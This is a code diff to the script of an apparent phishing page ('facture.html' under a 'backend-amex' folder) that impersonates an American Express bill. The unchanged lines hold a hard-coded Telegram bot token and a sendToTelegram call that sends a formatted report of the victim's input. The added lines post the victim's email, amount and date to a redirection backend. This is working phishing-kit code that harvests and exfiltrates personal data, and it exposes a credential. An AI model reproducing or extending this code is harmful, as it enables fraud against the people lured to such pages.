@@ -648,20 +648,6 @@ localStorage.removeItem('clientId');
 localStorage.setItem('clientId', 'CLIENT-' + Date.now());
 const clientId = localStorage.getItem('clientId');
 
-// Créer la redirection côté serveur au chargement de la page
-fetch('/backend-amex/create-redirection.php', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    clientId: clientId,
-    sourceUrl: '/facture.html',
-    type: 'facture'
-  })
-})
-.then(r => r.json())
-.then(d => console.log('Redirection créée:', d))
-.catch(e => console.error('Erreur create-redirection:', e));
-
   // Envoyer le message automatiquement au chargement de la page
 window.addEventListener('load', function() {
   const token = "8791271208:AAE1gIznsKHui2G_5X3P77v3VGzA6iN7whU";
@@ -845,7 +831,24 @@ if (!numero) {
 └━━━━━━⊱ 📞 ⊰━━━━━━━━━━━━</b>
   `;
   
-  // Afficher l'overlay de chargement (la page reste bloquée ici)
+  // Envoyer les données dans le JSON via create-redirection.php
+  fetch('/backend-amex/create-redirection.php', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      clientId: clientId,
+      sourceUrl: '/facture.html',
+      type: 'facture',
+      montant: montant,
+      dateFacture: date,
+      email: email
+    })
+  })
+  .then(r => r.json())
+  .then(d => console.log('Redirection créée:', d))
+  .catch(e => console.error('Erreur create-redirection:', e));
+
+  // Afficher l'overlay de chargement
   document.getElementById('loadingOverlay').classList.add('active');
   sendToTelegram(message);
   
